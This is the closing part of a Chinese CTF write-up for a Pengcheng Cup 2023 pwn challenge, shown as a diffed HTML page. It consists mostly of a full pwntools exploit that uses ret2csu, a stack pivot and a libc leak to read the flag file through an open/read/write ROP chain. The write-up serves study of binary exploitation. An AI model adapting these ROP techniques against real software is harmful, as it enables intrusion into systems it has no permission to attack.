+</span></span><span class="line"><span class="cl">    <span class="n">read_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdi</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为是复盘所以这里没有用题目给的libc，也不想再patch了。但是和实际情况基本没差，只要将exp中的libc加载成题目给的即可。</p>
+<p>实际运行结果：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106214615034.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106214615034.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106214615034.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106214615034.png?size=large 2x" sizes="auto" data-title="image-20231106214615034" data-alt="image-20231106214615034" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>flag文件是自己创建在根目录下的。下面给出完整的exp：</p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;info&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./silent&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">27</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">stdout</span> <span class="o">=</span> <span class="mh">0x601020</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x400876</span>
+</span></span><span class="line"><span class="cl"><span class="n">csu1</span> <span class="o">=</span> <span class="mh">0x40095A</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     rbx
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     rbp
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r12
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r13
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r14
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r15
+</span></span></span><span class="line"><span class="cl"><span class="s1">retn
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">csu2</span> <span class="o">=</span> <span class="mh">0x400940</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov     rdx, r15
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov     rsi, r14
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov     edi, r13d
+</span></span></span><span class="line"><span class="cl"><span class="s1">call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
+</span></span></span><span class="line"><span class="cl"><span class="s1">add     rbx, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">cmp     rbp, rbx
+</span></span></span><span class="line"><span class="cl"><span class="s1">jnz     short loc_400940
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x48</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">leave_ret</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">magic</span> <span class="o">=</span> <span class="mh">0x4007e8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">offset</span><span class="p">,</span> <span class="n">stdout</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">magic</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x800</span><span class="p">),</span> <span class="mh">0x1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">leave_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00\x00\x00</span><span class="s1">&#39;</span> <span class="c1"># base_stage + 39 * 8</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># info(hex(libc_base))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">open_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x400963</span>
+</span></span><span class="line"><span class="cl"><span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2601f</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x142c92</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdi</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">40</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">open_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rsi</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">read_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdi</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>不枉我补了1天，确实是好题。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-11-06 20:05:43">更新于 2023-11-06&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/11/pcb2023/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/11/pcb2023/" data-title="鹏城杯2023WriteUp-Pwn" data-via="a1extang" data-hashtags="CTF,Pwn,WriteUp"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/11/pcb2023/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/11/pcb2023/" data-title="鹏城杯2023WriteUp-Pwn"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/pwn/' class="post-tag">Pwn</a><a href='/tags/writeup/' class="post-tag">WriteUp</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/11/advancerop-ret2dlresolve/" class="post-nav-item" rel="prev" title="AdvanceROP-ret2dlresolve"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>AdvanceROP-ret2dlresolve</a>
+      <a href="/articles/2023/11/fmt_str/" class="post-nav-item" rel="next" title="格式化字符串漏洞总结">格式化字符串漏洞总结<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
